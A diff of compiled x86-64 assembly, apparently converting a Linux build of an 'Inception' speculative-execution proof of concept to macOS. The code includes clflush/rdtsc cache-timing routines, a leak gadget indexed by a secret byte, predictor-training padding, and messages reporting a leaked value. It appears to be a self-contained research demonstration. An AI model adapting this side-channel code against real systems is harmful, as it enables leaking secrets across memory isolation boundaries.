@@ -1,445 +1,1416 @@
-	.file	"inception_x86.c"
-	.text
-	.comm	probe_array,16384,32
-	.globl	flush_probe_array
-	.type	flush_probe_array, @function
-flush_probe_array:
-.LFB4262:
+	.section	__TEXT,__text,regular,pure_instructions
+	.build_version macos, 15, 5	sdk_version 15, 5
+	.globl	_flush_probe_array              ## -- Begin function flush_probe_array
+	.p2align	4, 0x90
+_flush_probe_array:                     ## @flush_probe_array
 	.cfi_startproc
-	endbr64
+## %bb.0:
 	pushq	%rbp
 	.cfi_def_cfa_offset 16
-	.cfi_offset 6, -16
+	.cfi_offset %rbp, -16
 	movq	%rsp, %rbp
-	.cfi_def_cfa_register 6
-	movl	$0, -12(%rbp)
-	jmp	.L2
-.L3:
-	movl	-12(%rbp), %eax
-	sall	$6, %eax
-	cltq
-	leaq	probe_array(%rip), %rdx
-	addq	%rdx, %rax
-	movq	%rax, -8(%rbp)
-	movq	-8(%rbp), %rax
+	.cfi_def_cfa_register %rbp
+	movl	$0, -4(%rbp)
+LBB0_1:                                 ## =>This Inner Loop Header: Depth=1
+	cmpl	$256, -4(%rbp)                  ## imm = 0x100
+	jge	LBB0_4
+## %bb.2:                               ##   in Loop: Header=BB0_1 Depth=1
+	movl	-4(%rbp), %eax
+	shll	$6, %eax
+	movslq	%eax, %rcx
+	movq	_probe_array@GOTPCREL(%rip), %rax
+	addq	%rcx, %rax
 	clflush	(%rax)
-	nop
-	addl	$1, -12(%rbp)
-.L2:
-	cmpl	$255, -12(%rbp)
-	jle	.L3
+## %bb.3:                               ##   in Loop: Header=BB0_1 Depth=1
+	movl	-4(%rbp), %eax
+	addl	$1, %eax
+	movl	%eax, -4(%rbp)
+	jmp	LBB0_1
+LBB0_4:
 	mfence
-	nop
-	nop
 	popq	%rbp
-	.cfi_def_cfa 7, 8
-	ret
+	retq
 	.cfi_endproc
-.LFE4262:
-	.size	flush_probe_array, .-flush_probe_array
-	.type	rdtsc, @function
-rdtsc:
-.LFB4263:
+                                        ## -- End function
+	.globl	_measure_access_time            ## -- Begin function measure_access_time
+	.p2align	4, 0x90
+_measure_access_time:                   ## @measure_access_time
 	.cfi_startproc
+## %bb.0:
 	pushq	%rbp
 	.cfi_def_cfa_offset 16
-	.cfi_offset 6, -16
+	.cfi_offset %rbp, -16
 	movq	%rsp, %rbp
-	.cfi_def_cfa_register 6
+	.cfi_def_cfa_register %rbp
+	subq	$32, %rsp
+	movq	%rdi, -8(%rbp)
+	callq	_rdtsc
+	movq	%rax, -16(%rbp)
+	movq	-8(%rbp), %rax
+	movb	(%rax), %al
+	movb	%al, -25(%rbp)
+	mfence
+	callq	_rdtsc
+	movq	%rax, -24(%rbp)
+	movq	-24(%rbp), %rax
+	subq	-16(%rbp), %rax
+	addq	$32, %rsp
+	popq	%rbp
+	retq
+	.cfi_endproc
+                                        ## -- End function
+	.globl	_benign_target                  ## -- Begin function benign_target
+	.p2align	4, 0x90
+_benign_target:                         ## @benign_target
+	.cfi_startproc
+## %bb.0:
+	pushq	%rbp
+	.cfi_def_cfa_offset 16
+	.cfi_offset %rbp, -16
+	movq	%rsp, %rbp
+	.cfi_def_cfa_register %rbp
+	popq	%rbp
+	retq
+	.cfi_endproc
+                                        ## -- End function
+	.globl	_common_init                    ## -- Begin function common_init
+	.p2align	4, 0x90
+_common_init:                           ## @common_init
+	.cfi_startproc
+## %bb.0:
+	pushq	%rbp
+	.cfi_def_cfa_offset 16
+	.cfi_offset %rbp, -16
+	movq	%rsp, %rbp
+	.cfi_def_cfa_register %rbp
+	subq	$16, %rsp
+	movq	_probe_array@GOTPCREL(%rip), %rdi
+	xorl	%esi, %esi
+	movl	$16384, %edx                    ## imm = 0x4000
+	callq	_memset
+	movl	$0, -4(%rbp)
+LBB3_1:                                 ## =>This Inner Loop Header: Depth=1
+	cmpl	$16384, -4(%rbp)                ## imm = 0x4000
+	jge	LBB3_4
+## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
+	movslq	-4(%rbp), %rcx
+	movq	_probe_array@GOTPCREL(%rip), %rax
+	movb	$1, (%rax,%rcx)
+## %bb.3:                               ##   in Loop: Header=BB3_1 Depth=1
+	movl	-4(%rbp), %eax
+	addl	$64, %eax
+	movl	%eax, -4(%rbp)
+	jmp	LBB3_1
+LBB3_4:
+	mfence
+	callq	_flush_probe_array
+	mfence
+	addq	$16, %rsp
+	popq	%rbp
+	retq
+	.cfi_endproc
+                                        ## -- End function
+	.globl	_perform_measurement            ## -- Begin function perform_measurement
+	.p2align	4, 0x90
+_perform_measurement:                   ## @perform_measurement
+	.cfi_startproc
+## %bb.0:
+	pushq	%rbp
+	.cfi_def_cfa_offset 16
+	.cfi_offset %rbp, -16
+	movq	%rsp, %rbp
+	.cfi_def_cfa_register %rbp
+	subq	$64, %rsp
+	movb	%dil, %al
+	movb	%al, -5(%rbp)
+	movq	%rsi, -16(%rbp)
+	leaq	L_.str(%rip), %rdi
+	movb	$0, %al
+	callq	_printf
+	movl	$-1, -20(%rbp)
+	movq	$-1, -32(%rbp)
+	movl	$50, -36(%rbp)
+	movl	$0, -40(%rbp)
+LBB4_1:                                 ## =>This Inner Loop Header: Depth=1
+	cmpl	$256, -40(%rbp)                 ## imm = 0x100
+	jge	LBB4_8
+## %bb.2:                               ##   in Loop: Header=BB4_1 Depth=1
+	movl	-40(%rbp), %eax
+	shll	$6, %eax
+	movslq	%eax, %rcx
+	movq	_probe_array@GOTPCREL(%rip), %rax
+	addq	%rcx, %rax
+	movq	%rax, -48(%rbp)
+	movq	-48(%rbp), %rdi
+	callq	_measure_access_time
+	movq	%rax, -56(%rbp)
+	movq	-56(%rbp), %rax
+	movslq	-36(%rbp), %rcx
+	cmpq	%rcx, %rax
+	jge	LBB4_6
+## %bb.3:                               ##   in Loop: Header=BB4_1 Depth=1
+	cmpq	$-1, -32(%rbp)
+	je	LBB4_5
+## %bb.4:                               ##   in Loop: Header=BB4_1 Depth=1
+	movq	-56(%rbp), %rax
+	cmpq	-32(%rbp), %rax
+	jge	LBB4_6
+LBB4_5:                                 ##   in Loop: Header=BB4_1 Depth=1
+	movq	-56(%rbp), %rax
+	movq	%rax, -32(%rbp)
+	movl	-40(%rbp), %eax
+	movl	%eax, -20(%rbp)
+LBB4_6:                                 ##   in Loop: Header=BB4_1 Depth=1
+	jmp	LBB4_7
+LBB4_7:                                 ##   in Loop: Header=BB4_1 Depth=1
+	movl	-40(%rbp), %eax
+	addl	$1, %eax
+	movl	%eax, -40(%rbp)
+	jmp	LBB4_1
+LBB4_8:
+	cmpl	$-1, -20(%rbp)
+	je	LBB4_12
+## %bb.9:
+	movq	-16(%rbp), %rsi
+	movl	-20(%rbp), %eax
+                                        ## kill: def $al killed $al killed $eax
+	movsbl	%al, %edx
+	movl	-20(%rbp), %ecx
+	movq	-32(%rbp), %r8
+	leaq	L_.str.1(%rip), %rdi
+	movb	$0, %al
+	callq	_printf
+	movl	-20(%rbp), %eax
+	movzbl	-5(%rbp), %ecx
+	cmpl	%ecx, %eax
+	jne	LBB4_11
+## %bb.10:
+	movq	-16(%rbp), %rsi
+	leaq	L_.str.2(%rip), %rdi
+	movb	$0, %al
+	callq	_printf
+	movl	$1, -4(%rbp)
+	jmp	LBB4_13
+LBB4_11:
+	movq	-16(%rbp), %rsi
+	leaq	L_.str.3(%rip), %rdi
+	movb	$0, %al
+	callq	_printf
+	movl	$0, -4(%rbp)
+	jmp	LBB4_13
+LBB4_12:
+	movq	-16(%rbp), %rsi
+	leaq	L_.str.4(%rip), %rdi
+	movb	$0, %al
+	callq	_printf
+	movl	$0, -4(%rbp)
+LBB4_13:
+	movl	-4(%rbp), %eax
+	addq	$64, %rsp
+	popq	%rbp
+	retq
+	.cfi_endproc
+                                        ## -- End function
+	.globl	_leak_gadget_inception          ## -- Begin function leak_gadget_inception
+	.p2align	4, 0x90
+_leak_gadget_inception:                 ## @leak_gadget_inception
+	.cfi_startproc
+## %bb.0:
+	pushq	%rbp
+	.cfi_def_cfa_offset 16
+	.cfi_offset %rbp, -16
+	movq	%rsp, %rbp
+	.cfi_def_cfa_register %rbp
+	movb	%dil, %al
+	movb	%al, -1(%rbp)
+	movzbl	-1(%rbp), %eax
+	shll	$6, %eax
+	movslq	%eax, %rcx
+	movq	_probe_array@GOTPCREL(%rip), %rax
+	movb	$1, (%rax,%rcx)
+	movzbl	-1(%rbp), %eax
+	shll	%eax
+	movl	%eax, -8(%rbp)
+	movl	-8(%rbp), %eax
+	popq	%rbp
+	retq
+	.cfi_endproc
+                                        ## -- End function
+	.globl	_victim_function_inception      ## -- Begin function victim_function_inception
+	.p2align	4, 0x90
+_victim_function_inception:             ## @victim_function_inception
+	.cfi_startproc
+## %bb.0:
+	pushq	%rbp
+	.cfi_def_cfa_offset 16
+	.cfi_offset %rbp, -16
+	movq	%rsp, %rbp
+	.cfi_def_cfa_register %rbp
+	movl	$0, -4(%rbp)
+	movl	$0, -8(%rbp)
+LBB6_1:                                 ## =>This Inner Loop Header: Depth=1
+	cmpl	$10, -8(%rbp)
+	jge	LBB6_4
+## %bb.2:                               ##   in Loop: Header=BB6_1 Depth=1
+	movl	-8(%rbp), %ecx
+	movl	-4(%rbp), %eax
+	addl	%ecx, %eax
+	movl	%eax, -4(%rbp)
+## %bb.3:                               ##   in Loop: Header=BB6_1 Depth=1
+	movl	-8(%rbp), %eax
+	addl	$1, %eax
+	movl	%eax, -8(%rbp)
+	jmp	LBB6_1
+LBB6_4:
+	movl	-4(%rbp), %eax
+	popq	%rbp
+	retq
+	.cfi_endproc
+                                        ## -- End function
+	.globl	_main                           ## -- Begin function main
+	.p2align	4, 0x90
+_main:                                  ## @main
+	.cfi_startproc
+## %bb.0:
+	pushq	%rbp
+	.cfi_def_cfa_offset 16
+	.cfi_offset %rbp, -16
+	movq	%rsp, %rbp
+	.cfi_def_cfa_register %rbp
+	subq	$32, %rsp
+	movl	$0, -4(%rbp)
+	callq	_common_init
+	leaq	L_.str.5(%rip), %rdi
+	movb	$0, %al
+	callq	_printf
+	leaq	L_.str.6(%rip), %rdi
+	movb	$0, %al
+	callq	_printf
+	leaq	L_.str.7(%rip), %rdi
+	leaq	_leak_gadget_inception(%rip), %rsi
+	movb	$0, %al
+	callq	_printf
+	movzbl	_secret_inception_data(%rip), %esi
+	movzbl	_secret_inception_data(%rip), %edx
+	leaq	L_.str.8(%rip), %rdi
+	movb	$0, %al
+	callq	_printf
+	leaq	_leak_gadget_inception(%rip), %rax
+	movq	%rax, -16(%rbp)
+	movb	_secret_inception_data(%rip), %al
+	movb	%al, -17(%rbp)
+	## InlineAsm Start
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+	xorl	%eax, %eax
+	nop
+	nop
+	nop
+
+	## InlineAsm End
+	mfence
+	callq	_flush_probe_array
+	mfence
+	callq	_flush_probe_array
+	lfence
+	leaq	L_.str.9(%rip), %rdi
+	movb	$0, %al
+	callq	_printf
+	leaq	_leak_gadget_inception(%rip), %rax
+	movq	%rax, -16(%rbp)
+	movb	_secret_inception_data(%rip), %al
+	movb	%al, -17(%rbp)
+	callq	_victim_function_inception
+	lfence
+	leaq	L_.str.10(%rip), %rsi
+	movzbl	_secret_inception_data(%rip), %edi
+	callq	_perform_measurement
+	movzbl	_secret_inception_data(%rip), %esi
+	leaq	L_.str.11(%rip), %rdi
+	movb	$0, %al
+	callq	_printf
+	xorl	%eax, %eax
+	addq	$32, %rsp
+	popq	%rbp
+	retq
+	.cfi_endproc
+                                        ## -- End function
+	.p2align	4, 0x90                         ## -- Begin function rdtsc
+_rdtsc:                                 ## @rdtsc
+	.cfi_startproc
+## %bb.0:
+	pushq	%rbp
+	.cfi_def_cfa_offset 16
+	.cfi_offset %rbp, -16
+	movq	%rsp, %rbp
+	.cfi_def_cfa_register %rbp
 	rdtsc
-	salq	$32, %rdx
+	shlq	$32, %rdx
 	orq	%rdx, %rax
 	popq	%rbp
-	.cfi_def_cfa 7, 8
-	ret
+	retq
 	.cfi_endproc
-.LFE4263:
-	.size	rdtsc, .-rdtsc
-	.globl	measure_access_time
-	.type	measure_access_time, @function
-measure_access_time:
-.LFB4264:
-	.cfi_startproc
-	endbr64
-	pushq	%rbp
-	.cfi_def_cfa_offset 16
-	.cfi_offset 6, -16
-	movq	%rsp, %rbp
-	.cfi_def_cfa_register 6
-	subq	$40, %rsp
-	movq	%rdi, -40(%rbp)
-	movl	$0, %eax
-	call	rdtsc
-	movq	%rax, -16(%rbp)
-	movq	-40(%rbp), %rax
-	movzbl	(%rax), %eax
-	movb	%al, -17(%rbp)
-	mfence
-	nop
-	movl	$0, %eax
-	call	rdtsc
-	movq	%rax, -8(%rbp)
-	movq	-8(%rbp), %rax
-	subq	-16(%rbp), %rax
-	leave
-	.cfi_def_cfa 7, 8
-	ret
-	.cfi_endproc
-.LFE4264:
-	.size	measure_access_time, .-measure_access_time
-	.globl	benign_target
-	.type	benign_target, @function
-benign_target:
-.LFB4265:
-	.cfi_startproc
-	endbr64
-	pushq	%rbp
-	.cfi_def_cfa_offset 16
-	.cfi_offset 6, -16
-	movq	%rsp, %rbp
-	.cfi_def_cfa_register 6
-	nop
-	popq	%rbp
-	.cfi_def_cfa 7, 8
-	ret
-	.cfi_endproc
-.LFE4265:
-	.size	benign_target, .-benign_target
-	.globl	common_init
-	.type	common_init, @function
-common_init:
-.LFB4266:
-	.cfi_startproc
-	endbr64
-	pushq	%rbp
-	.cfi_def_cfa_offset 16
-	.cfi_offset 6, -16
-	movq	%rsp, %rbp
-	.cfi_def_cfa_register 6
-	subq	$16, %rsp
-	movl	$16384, %edx
-	movl	$0, %esi
-	leaq	probe_array(%rip), %rdi
-	call	memset@PLT
-	movl	$0, -4(%rbp)
-	jmp	.L11
-.L12:
-	movl	-4(%rbp), %eax
-	cltq
-	leaq	probe_array(%rip), %rdx
-	movb	$1, (%rax,%rdx)
-	addl	$64, -4(%rbp)
-.L11:
-	cmpl	$16383, -4(%rbp)
-	jle	.L12
-	mfence
-	nop
-	movl	$0, %eax
-	call	flush_probe_array
-	mfence
-	nop
-	nop
-	leave
-	.cfi_def_cfa 7, 8
-	ret
-	.cfi_endproc
-.LFE4266:
-	.size	common_init, .-common_init
-	.section	.rodata
-.LC0:
-	.string	"Measuring cache timings..."
-	.align 8
-.LC1:
-	.string	"Leaked %s (speculatively): %c (ASCII %d), Access Time: %lld cycles\n"
-	.align 8
-.LC2:
-	.string	"SUCCESS! Leaked the actual %s.\n"
-	.align 8
-.LC3:
-	.string	"LEAKED VALUE DOES NOT MATCH ACTUAL %s.\n"
-	.align 8
-.LC4:
-	.string	"No %s leaked or could not detect leakage.\n"
-	.text
-	.globl	perform_measurement
-	.type	perform_measurement, @function
-perform_measurement:
-.LFB4267:
-	.cfi_startproc
-	endbr64
-	pushq	%rbp
-	.cfi_def_cfa_offset 16
-	.cfi_offset 6, -16
-	movq	%rsp, %rbp
-	.cfi_def_cfa_register 6
-	subq	$64, %rsp
-	movl	%edi, %eax
-	movq	%rsi, -64(%rbp)
-	movb	%al, -52(%rbp)
-	leaq	.LC0(%rip), %rdi
-	call	puts@PLT
